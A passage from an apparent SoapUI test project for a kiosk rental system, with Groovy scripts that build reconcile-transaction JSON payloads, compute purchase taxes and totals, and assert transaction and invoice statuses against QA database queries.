	rentalPayload += "], \"Totals\" : { \"TaxRate\" : " + context.expand( '${#TestCase#RentalTaxRate}') + ", \"Subtotal\" : " + rentalTotal + ", \"DiscountedSubtotal\" : " + discountedSubTotal + ", \"TaxAmount\" : \"" + rentalTaxAmt + "\", \"GrandTotal\" : " + grandTotal + " } }";
	testRunner.testCase.setPropertyValue("rentalPayload",rentalPayload);
	rentalTotal = grandTotal;//Defining it to calculate Total Amount
}

//Purchase payload
if (purchaseCount <= 0)
{
	log.info ("No Purchases in the transaction");
	testRunner.testCase.setPropertyValue('VendedPurchaseCount', VendedPurchaseCount.toString());
}
else
{
	for (p = 0; p < purchaseBarcodesList.size(); p++)
	{				
		curOfferCode = purchaseofferCodeList[p].toString().trim();
		curpurchaseBarcode = purchaseBarcodesList[p].toString().trim();
		curpurchaseTitleIds = purchaseTitleIdsList[p].toString().trim();
		curpurchaseProductFamily = purchaseProductFamilyList[p].toString().trim();
		curpurchaseProductType = purchaseProductTypeList[p].toString().trim();
		curpurchaseDiscPrice = purchaseDiscPriceList[p].toString().trim();
		curpurchaseVendStatus = purchaseVendStatusList[p].toString().trim();
		//MDV
		curPurchaseMDVFlag = purchaseMDVFlagList[p].toString().trim();
		curPurchaseMDVDiscNumber = purchaseMDVDiscNumberList[p].toString().trim();
		//Purchase Payload
		purchasePayload += "{"
		purchasePayload += "\"ProductId\" : $curpurchaseTitleIds,"
		purchasePayload += "\"Barcode\" : \"$curpurchaseBarcode\","
		purchasePayload += "\"VendStatus\" : \"$curpurchaseVendStatus\"," //To-DO
		purchasePayload += "\"ProductFamily\" : \"$curpurchaseProductFamily\","
		purchasePayload += "\"ProductType\" : \"$curpurchaseProductType\","
		purchasePayload += "\"MultiDisc\" : $curPurchaseMDVFlag,"
		purchasePayload += "\"DiscNumber\" : $curPurchaseMDVDiscNumber,"
		if (curOfferCode == '1')
		{
			purchasePayload += "\"OfferCode\" : \"RC\","
		}
		else
		{
			purchasePayload += "\"OfferCode\" : null,"
		}
		purchasePayload += "\"Pricing\" : {"
		purchasePayload += "\"InitialNight\" : 0,"
		purchasePayload += "\"ExtraNight\" : 0,"
		purchasePayload += "\"NonReturn\" : 0,"
		purchasePayload += "\"Purchase\" : $curpurchaseDiscPrice,"
		purchasePayload += "\"Expiration\" : 0,"
		purchasePayload += "\"NonReturnDays\" : 0,"
		purchasePayload += "\"PriceSetId\" : 0,"
		//Added a part of ProductPricing for BI; harcoded for the time being.
		purchasePayload += "\"ProductPriceId\" : 0,"
		purchasePayload += "\"InitialDays\" : null,"
		purchasePayload += "\"DefaultInitialNight\" : null,"
		purchasePayload += "\"DefaultExtraNight\" : null"
		purchasePayload += "}," 
		purchasePayload += "\"BlurayUpsell\" : null,"
		purchasePayload += "\"ItemSourceType\" : 3"
		purchasePayload += "}"

		if (p+1 < purchaseBarcodesList.size())
		{
		   purchasePayload += ","
		}
		//Capture vended rentals count and non-vended dics.
		if (curpurchaseVendStatus.equals("Vended")) 
		{
			if (curpurchaseProductType == "DigitalCode")
			{
				//Capture Amount of the Disc (DigitalCode)
				digitalTotal += (curpurchaseDiscPrice.toBigDecimal());
				//Capture Vended Rental
				vendedPurchaseBarcodes.add(curpurchaseBarcode);
				testRunner.testCase.setPropertyValue("BarcodeForTnx", curpurchaseBarcode);
				VendedPurchaseCount += 1;
			}
			else
			{
				//Capture Amount of the Disc (Regular Purchase)
				purchaseTotal += (curpurchaseDiscPrice.toBigDecimal());
				//Capture Vended Rental
				vendedPurchaseBarcodes.add(curpurchaseBarcode);
				testRunner.testCase.setPropertyValue("BarcodeForTnx", curpurchaseBarcode);
				VendedPurchaseCount += 1;
			}
		} 
		else 
		{
			//Capture Non-vended Rentals
			nonvendedPurchaseBarcodes.add(curpurchaseBarcode);
			testRunner.testCase.setPropertyValue("NonVendedBarcodeForTnx", curpurchaseBarcode);
		}
	}
	
	testRunner.testCase.setPropertyValue('VendedPurchaseBarcodes', vendedPurchaseBarcodes.join(",").toString());
	testRunner.testCase.setPropertyValue('NonVendedPurchaseBarcodes', nonvendedPurchaseBarcodes.join(",").toString());
	testRunner.testCase.setPropertyValue('VendedPurchaseCount', VendedPurchaseCount.toString());
	
	//Purchase Calculation	
	BigDecimal totalPurchaseTotal = (purchaseTotal.toBigDecimal() + digitalTotal.toBigDecimal())
	log.info ("totalPurchaseTotal: $totalPurchaseTotal");
	
	def purchasetaxRate = context.expand( '${#TestCase#PurchaseTaxRate}');
	def digitalpurchasetaxRate = context.expand( '${#TestCase#DigitalPurchaseTaxRate}');
	if (digitalpurchasetaxRate == null || digitalpurchasetaxRate == "null" || digitalpurchasetaxRate == "") //If digitalpurchasetaxrate is null than use Purchase tax rate.
	{
		BigDecimal digitaltaxRate = ((purchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	else //if digitalpurchasetaxrate is not null than use that ever is provided.
	{
		BigDecimal digitaltaxRate = ((digitalpurchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	def totaldigitalpurchasetaxAmount = context.expand( '${#TestCase#digitalpurchaseTaxAmt}');
		
	BigDecimal purchaseTaxAmt = (Round16.format(purchaseTotal).toBigDecimal()) * ((purchasetaxRate).toBigDecimal()/100);
	purchaseTaxAmt = Round16.format(purchaseTaxAmt).toBigDecimal();
	
	log.info ("Digital Purchase Tax Amount: $totaldigitalpurchasetaxAmount; Purchase Tax Amount: $purchaseTaxAmt");
	def totalTaxAmount = (totaldigitalpurchasetaxAmount.toBigDecimal() + purchaseTaxAmt.toBigDecimal());
	BigDecimal purchaseGrandTotal = (totalPurchaseTotal + totalTaxAmount).toBigDecimal();
	log.info("Purchase Grand Total: $purchaseGrandTotal; Total Tax Amount: $totalTaxAmount");
	
	def HasPhysicalPurchase = context.expand( '${#TestCase#HasPhysicalPurchase}');
	// add totals to the strings
	purchasePayload += "], \"Totals\" : { ";
	if (HasPhysicalPurchase == 'true')
	{
		purchasePayload += "\"TaxRate\" : " + context.expand('${#TestCase#PurchaseTaxRate}') + ", ";
	}
	else
	{
		purchasePayload += "\"TaxRate\" : " + context.expand('${#TestCase#DigitalPurchaseTaxRate}') + ", ";
	}
	purchasePayload += "\"Subtotal\" : " + totalPurchaseTotal + ",";
	purchasePayload += "\"DiscountedSubtotal\" : " + totalPurchaseTotal + ",";
	purchasePayload += "\"TaxAmount\" : \"" + totalTaxAmount + "\",";
	purchasePayload += "\"GrandTotal\" : " + purchaseGrandTotal + " } }";
	
	// add totals to the strings
	//purchasePayload += "], \"Totals\" : { \"TaxRate\" : " + context.expand('${#TestCase#purchasetaxrate}') + ", \"Subtotal\" : " + totalPurchaseTotal + ", \"DiscountedSubtotal\" : " + totalPurchaseTotal + ", \"TaxAmount\" : \"" + totalTaxAmount + "\", \"GrandTotal\" : " + purchaseGrandTotal + " } }";
	testRunner.testCase.setPropertyValue("purchasePayload",purchasePayload);
	purchaseTotal = purchaseGrandTotal;//Defining it to calculate Total Amount
}
//log.info ("purchasePayload: $purchasePayload; rentalPayload: $rentalPayload");
TransactionTotal = (rentalTotal + purchaseTotal).setScale(2, BigDecimal.ROUND_HALF_UP);
testRunner.testCase.setPropertyValue("TransactionTotal",TransactionTotal.toString());

def MessageId = UUID.randomUUID().toString();
def PromoCode = context.expand( '${#TestCase#PromoCode}');
def UseCredits = context.expand( '${#TestCase#UseCredits}');
calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));
def Email = context.expand( '${#TestCase#Email}');
def IsOffline = context.expand( '${#TestCase#IsOffline}');
def TransactionID = context.expand( '${#TestCase#TransactionID}');

//Build Reconcile Request
requestPayload += "{";
requestPayload += "\"MessageType\": \"Reconcile\",";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"IsOffline\": $IsOffline,";
requestPayload += "\"Blocklisted\": false,";
requestPayload += "\"Email\": \"$Email\",";
requestPayload += "\"EngineVersion\": \"1.27.1.297\",";
requestPayload += "\"BundleVersion\": \"2.27.1.65\",";
requestPayload += "\"KioskId\": $KioskId,";
if ((CustomerProfileNumber == "") || (CustomerProfileNumber == "<CPCUSTOMERNUMBER/>"))
{
	//No CP for the credit card
	requestPayload += "\"CustomerProfileNumber\": null,";
}
else
{
	requestPayload += "\"CustomerProfileNumber\": \"$CustomerProfileNumber\",";
}
requestPayload += "\"ReferenceNumber\": $TransactionID,";
requestPayload += "$ccPayload";
requestPayload += "\"TransactionDate\": {";
requestPayload += "\"theDate\": $theDate,";
requestPayload += "\"dateTimeKind\": \"Unspecified\",";
requestPayload += "\"dateString\": \"$dateString\"";
requestPayload += "},";
requestPayload += "\"PlayPassPromptAccepted\": false,";
requestPayload += "\"PlayPassPointsEarned\": 0,";
if (IsOffline == 'false')
{
	//requestPayload += "\"PropertyBag\": { \"EarlyIdIndicator\":\"false\" }," //Currently hard coded to true for Online and false for Offline.
	requestPayload += "\"PropertyBag\": { \"EarlyIdIndicator\":\"true\" },"
}
else
{
	//requestPayload += "\"PropertyBag\": { },";
	requestPayload += "\"PropertyBag\": {},"
}
requestPayload += "\"ShoppingCart\": { ";
requestPayload += "\"Groups\": [  ";
if (rentalCount > 0 && purchaseCount == 0) {
	requestPayload += "$rentalPayload";
} else if (rentalCount == 0 && purchaseCount > 0) {
	requestPayload += "$purchasePayload";
} else if (rentalCount > 0 && purchaseCount > 0) {
	requestPayload += "$rentalPayload,$purchasePayload";
} else {
//MDV
tc.setPropertyValue("RentalMDVFlag", authtc.getPropertyValue("RentalMDVFlag"));
tc.setPropertyValue("RentalMDVDiscNumber", authtc.getPropertyValue("RentalMDVDiscNumber"));
tc.setPropertyValue("PurchaseMDVFlag", authtc.getPropertyValue("PurchaseMDVFlag"));
tc.setPropertyValue("PurchaseMDVDiscNumber", authtc.getPropertyValue("PurchaseMDVDiscNumber"));
	log.info("No rental or purchase information generated!");
}
requestPayload += "],";
requestPayload += "\"Discounts\": [$discountPayload]";
requestPayload += "$serviceFeePayload";
requestPayload += "}} ";

// log to soapui log
log.info("Reconcile Request: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result)
testRunner.testCase.setPropertyValue("ReconcileGUID",MessageId.toString()); //For MessageControl Validations]]></script></con:config></con:testStep><con:testStep type="httprequest" name="Reconcile (Request)" id="2af8128e-92f2-4612-b53e-f49aac07b35d"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" name="Reconcile (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" id="b2fa5210-dde2-4787-8c9d-57bcd781cdfc" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" name="Check for Success and HasErrors" id="70bc7102-0d46-4704-81fc-09b7237cee25"><con:configuration><scriptText>def response = URLDecoder.decode(messageExchange.getResponseContent())

log.info ("Reconcile Response: $response")
	assert response.contains("\"Success\":true,")
	assert response.contains("\"HasErrors\":false,")

</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>Basic</con:selectedAuthProfile><con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes><con:authType>Global HTTP Settings</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>Basic</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>Basic</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="Get ReferenceNumber" id="7b94df85-c3dd-42fb-a88d-6bdc1c1a5a10"><con:settings/><con:config><script>import groovy.json.JsonSlurper
def IsOffline = context.expand( '${#TestCase#IsOffline}');
def BarcodeForTnx = context.expand( '${#TestCase#BarcodeForTnx}');
Barcode = "";
if (BarcodeForTnx == "")
{
	Barcode = context.expand( '${#TestCase#NonVendedBarcodeForTnx}');
}
else
{
	Barcode = context.expand( '${#TestCase#BarcodeForTnx}');
}

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);
def getTnxQuery = "";

if (IsOffline == 'true')
{
	//Build SQL Query
	getTnxQuery += "Select TOP 1 "
	getTnxQuery += "\n"
	getTnxQuery += "t.Transaction_ID,t.InvoiceID "
	getTnxQuery += "\n"
	getTnxQuery += "From [Transaction] t"
	getTnxQuery += "\n"
	getTnxQuery += "Inner Join Disc_Transaction dt  on t.Transaction_ID = dt.Transaction_ID "
	getTnxQuery += "\n"
	getTnxQuery += "Inner Join Disc d  on d.Disc_id = dt.Disc_id "
	getTnxQuery += "\n"
	getTnxQuery += "Where d.RF_ID = '$Barcode'"
	getTnxQuery += "\n"
	getTnxQuery += "Order by t.Transaction_ID desc"

	def getTnxInfo = sql.firstRow(getTnxQuery);
	def TransactionID = getTnxInfo.Transaction_ID.toString();
	def InvoiceID = getTnxInfo.InvoiceID.toString();
	log.info ("TransactionID:$TransactionID; InvoiceID:$InvoiceID");
	testRunner.testCase.setPropertyValue("TransactionID",TransactionID);
	testRunner.testCase.setPropertyValue("InvoiceID",InvoiceID);
}
else
{
	log.info ("TransactionId is generated from Auth");
}</script></con:config></con:testStep><con:testStep type="jdbc" name="Check Transaction" id="18219dd3-4429-4251-b9ee-309f79430bb5"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT  
	transaction_status,
	approvalcode,
	RentalType,
	OptInTypeId,
	BillingTypeID,
	IsOffline,
	shoppingCartType
FROM
	[Transaction](nolock)
WHERE 
	transaction_id = :txnid</con:query><con:assertion type="GroovyScriptAssertion" name="Validations" id="32f2af03-b987-432f-a201-9858d49438c3" disabled="true"><con:configuration><scriptText>//Get the actual values from JDBC response
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def actualAppprovalCode = holder.getNodeValue("//APPROVALCODE[1]");
def offline = context.expand( '${#TestCase#IsOffline}' );
String approve = actualAppprovalCode.toString();	
if(offline == 'true')
{
	//assert actualAppprovalCode == '&lt;APPROVALCODE/>'
	assert actualAppprovalCode == null
}
else
{	
	 assert approve.substring(0,8) == 'Approved';
}

//BillingTypeID Validation
def actualBillingTypeID = holder.getNodeValue("//BILLINGTYPEID[1]")
assert actualBillingTypeID == null

//Added if and else logic for PRM and PRG functionality and GiftCard.
/*
 * def numrentals = context.expand( '${#TestCase#RentalCount}' ).toInteger();
def numpurchases = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
def CCType = context.expand( '${#TestCase#CardType}' ).toInteger();
int actualBillingTypeID = holder.getNodeValue("//BILLINGTYPEID[1]").toInteger();
if ((numrentals > 0 &amp;&amp; numpurchases > 0) || CCType == 6)
{
	assert actualBillingTypeID == 6; //Because of PRM and PRG functionality.
}
else
{
	assert actualBillingTypeID == 7;
}
*/</scriptText></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" name="Check [RENTALTYPE]" id="41d4abab-7b86-425c-8d6c-ceeb83aaa819"><con:configuration><scriptText>def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def offline = context.expand( '${#TestCase#IsOffline}' );
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def rentalType = holder.getNodeValue("//RENTALTYPE[1]");
def isOffline = holder.getNodeValue("//ISOFFLINE[1]");

if(offline == 'true')
{
	assert rentalType == '2'
	assert isOffline == '1'
}
else
{
	//assert isOffline == NULL
	assert rentalType == '1'
}</scriptText></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="1ed83441-2817-4b26-9b40-e57d25b3b968" name="Validations-[TransactionStatus]"><con:configuration><scriptText>//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def actualAppprovalCode = holder.getNodeValue("//APPROVALCODE[1]");
def offline = context.expand( '${#TestCase#IsOffline}' );
def actualTransactionStatus = holder.getNodeValue("//TRANSACTION_STATUS[1]").toInteger();
String approve = actualAppprovalCode.toString();
//Rental and Purchase after vend/reconcile
def numrentals = context.expand( '${#TestCase#VendedRentalsCount}' ).toInteger();
def numpurchases = context.expand( '${#TestCase#VendedPurchaseCount}' ).toInteger();
//Rental and Purchase before vend/reconcile
def rentalCount = context.expand( '${#TestCase#RentalCount}' ).toInteger();
def purchaseCount = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
def rentalVendStatus = context.expand( '${#TestCase#RentalVendStatus}' );
def purchaseVendStatus = context.expand( '${#TestCase#PurchaseVendStatus}' );

rentalVendStatusList = rentalVendStatus.split(",");
currentalVendStatus = rentalVendStatusList.take(1).toString().replace("[", "").replace("]", "");
purchaseVendStatusList = purchaseVendStatus.split(",");
curpurchaseVendStatus = purchaseVendStatusList.take(1).toString().replace("[", "").replace("]", "");

//Check TransactionStatus
if ((numrentals > 0 || numpurchases > 0) &amp;&amp; (approve.contains("Approved") || offline == 'true'))
{
	assert (actualTransactionStatus == 4);
}
else if ((numrentals > 0 || numpurchases > 0) &amp;&amp;  (!approve.contains("Approved") || offline != 'true'))
{
	assert (actualTransactionStatus == 5);
}
else
{
	if (rentalCount > 0)
	{
		def tnxStatusQuery = sql.firstRow("select TransactionStatusID from TransactionStatus Where replace(Description,' ','') like '%" + currentalVendStatus + "%'");
		def expectedTransactionStatus = tnxStatusQuery.TransactionStatusID.toInteger();
		log.info ("expectedTransactionStatus:$expectedTransactionStatus; actualTransactionStatus:$actualTransactionStatus");
		assert (actualTransactionStatus == expectedTransactionStatus);
		
	}
	else if (purchaseCount > 0)
	{
		def tnxStatusQuery = sql.firstRow("select TransactionStatusID from TransactionStatus Where replace(Description,' ','') like '%" + curpurchaseVendStatus + "%'");
		def expectedTransactionStatus = tnxStatusQuery.TransactionStatusID.toInteger();
		log.info ("expectedTransactionStatus:$expectedTransactionStatus; actualTransactionStatus:$actualTransactionStatus");
		assert (actualTransactionStatus == expectedTransactionStatus);
	}
}</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>txnid</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check DiscTransaction" id="3bf70102-9159-49ab-af5c-15e14d869968"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT
	DISCTRANSACTION_STATUS
FROM
	disc_transaction (nolock)
WHERE
	transaction_id = :TransactionID</con:query><con:assertion type="GroovyScriptAssertion" id="083f13be-1903-4cfe-971b-c5d2b61e5086" name="DiscTransaction Status"><con:configuration><scriptText><![CDATA[def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check DiscTransaction#ResponseAsXml");
def actualDiscTransactionStatus = holder.getNodeValue("//Row[1]/DISCTRANSACTION_STATUS[1]");

def vendedRentals = context.expand( '${#TestCase#VendedRentalBarcodes}' )
def nonVendedRentals = context.expand( '${#TestCase#nonvendedRentalBarcodes}' )
def vendedPurchases = context.expand( '${#TestCase#VendedPurchaseBarcodes}' )
def nonVendedPurchases = context.expand( '${#TestCase#NonVendedPurchaseBarcodes}' )

if (vendedPurchases == "")
{
	if ((nonVendedRentals != "") && (vendedRentals == "")) 
	{
		assert actualDiscTransactionStatus.toInteger() == 1
	}		 
	else if ((nonVendedRentals == "") && (vendedRentals != ""))
	{
		assert actualDiscTransactionStatus.toInteger() == 2
	}		
	else if ((nonVendedRentals != "") && (vendedRentals != ""))
	{
		assert actualDiscTransactionStatus.toInteger() == 2
	}		
	else 
	{
		assert actualDiscTransactionStatus.toInteger() == 1
	}		
}
else
{
	assert actualDiscTransactionStatus.toInteger() == 2
}]]></scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>TransactionID</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check AmountBase" id="3e40d9fa-f8d7-456d-b82b-4d1f45d9a042" disabled="true"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>MerchantService</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/><con:query>SELECT 
	sum(amountbase) as totalAmountBase
FROM
	[InvoiceItem]
WHERE 
	Invoice = :InvoiceID
AND
	label = 1</con:query><con:assertion type="GroovyScriptAssertion" id="859a2ef5-91d6-4cb1-aecf-9b4c52dd67ec" name="AmountBase"><con:configuration><scriptText>import java.text.DecimalFormat;
//Round4 = new DecimalFormat("#.####");
def IsOffline = context.expand( '${#TestCase#IsOffline}' )
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def holder = groovyUtils.getXmlHolder( "Check AmountBase#ResponseAsXml");
def actualAmountBase = holder.getNodeValue("//TOTALAMOUNTBASE[1]").toBigDecimal().setScale(2, BigDecimal.ROUND_HALF_UP);
def expectedAmountBase = context.expand( '${#TestCase#TransactionTotal}' ).toBigDecimal().setScale(2, BigDecimal.ROUND_HALF_UP);
log.info ("actualAmountBase:$actualAmountBase; expectedAmountBase:$expectedAmountBase");
if (IsOffline == 'true')
{
	//assert (actualAmountBase != expectedAmountBase);
}
else
{
	assert (actualAmountBase == expectedAmountBase);
}
</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>InvoiceID</con:name><con:value>${#TestCase#InvoiceID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Invoice Details" id="b7945ccf-e0c0-45d1-b87c-5587c07718b2"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>MerchantService</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/><con:query>SELECT TOP 1
	i.[Status] AS InvStatus, 
	i.[System], 
	i.CreatedBy, 
	i.StoreNumber,
	i.CollectionMethod,
	ii.[Status]  AS InvItemStatus
FROM
	[Invoice] i (nolock)
INNER JOIN [InvoiceItem] ii ON i.OID = ii.Invoice
WHERE 
	i.OID = :InvoiceID</con:query><con:assertion type="XPath Match" id="efcc78e9-3208-4611-b3d8-4fbdcd0ddd89" name="Match content of [SYSTEM]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/SYSTEM[1]/text()</path><content>Rental Systems</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="96905afe-9a46-4b0b-9840-dfdfb72b774e" name="Match content of [CREATEDBY]" disabled="true"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/CREATEDBY[1]/text()</path><content>RB\KioskSvc_01_U</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="4207b007-8259-4190-b87f-c52ed3829198" name="CollectionMethod"><con:configuration><scriptText>import java.text.DecimalFormat;
//Round4 = new DecimalFormat("#.####");

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def invholder = groovyUtils.getXmlHolder( "Check Invoice Details#ResponseAsXml");
def actualCollectionMethod = invholder.getNodeValue("//COLLECTIONMETHOD[1]").toInteger();
def CCType = context.expand( '${#TestCase#CardType}' ).toInteger();

//Get the shopping cart type value from Get Transaction test step.
def tnxHolder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def shoppingCartType = tnxHolder.getNodeValue("//SHOPPINGCARTTYPE[1]").toInteger();
//based on config in QADB100.RedboxServerDB.dbo.KioskBillingConfig table
if ((shoppingCartType == 2)||(shoppingCartType == 3)||(CCType == 6))
{
	assert actualCollectionMethod == 3;
}
else
{
	assert actualCollectionMethod == 6;
}
</scriptText></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="444868cb-53b3-4d5b-b65e-bda98e8c4f41" name="Invoice/InvoiceItem Status"><con:configuration><scriptText>//Validate Invoice and InvoiceItem status.
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def invholder = groovyUtils.getXmlHolder( "Check Invoice Details#ResponseAsXml");
def actualInvoiceStatus = invholder.getNodeValue("//INVSTATUS[1]").toInteger();
def actualInvoiceItemStatus = invholder.getNodeValue("//INVITEMSTATUS[1]").toInteger();
def AmountBase = context.expand( '${#TestCase#TransactionTotal}' ).toBigDecimal().setScale(2, BigDecimal.ROUND_HALF_UP);
def CardType = context.expand( '${#TestCase#CardType}' ).toInteger();
def IsOffline = context.expand( '${#TestCase#IsOffline}' );
def RentalCount = context.expand( '${#TestCase#VendedRentalsCount}' ).toInteger();
def PurchaseCount = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
log.info ("AmountBase:$AmountBase; actualInvoiceStatus:$actualInvoiceStatus; actualInvoiceItemStatus:$actualInvoiceItemStatus");
//log.info ("CardType:$CardType; IsOffline:$IsOffline");
//Online Case
if (IsOffline == 'false')
{
   if (AmountBase == 0.00)
   {
   		if (CardType == 6)
   		{
   			if (RentalCount > 0 || PurchaseCount > 0)
   			{
   				assert (actualInvoiceStatus == 1);
          		assert (actualInvoiceItemStatus == 16);
   			}
   			else
   			{
   				 assert (actualInvoiceStatus == 4);
            		assert (actualInvoiceItemStatus == 15);
   			}
   		}
   		else
   		{
   			assert (actualInvoiceStatus == 1);
          	assert (actualInvoiceItemStatus == 17);
   		}          
   }
   else if (AmountBase > 0.00)
   {
       if ((PurchaseCount > 0) || (CardType == 6))
       {
           assert (actualInvoiceStatus == 1);
           assert (actualInvoiceItemStatus == 3);
       }
       else
       {
           assert (actualInvoiceStatus == 1);
           assert (actualInvoiceItemStatus == 17);
       }
   }
}
//Offline Case
else
{
    if (AmountBase == 0.00)
    {
        if (RentalCount > 0 || PurchaseCount > 0)
        {
            assert (actualInvoiceStatus == 1);
            assert (actualInvoiceItemStatus == 16);
        }
        else
        {
            assert (actualInvoiceStatus == 4);
            assert (actualInvoiceItemStatus == 15);
        }
        
    }
    else if (AmountBase > 0.00)
    {
        assert (actualInvoiceStatus == 1);
        assert (actualInvoiceItemStatus == 6)
    }
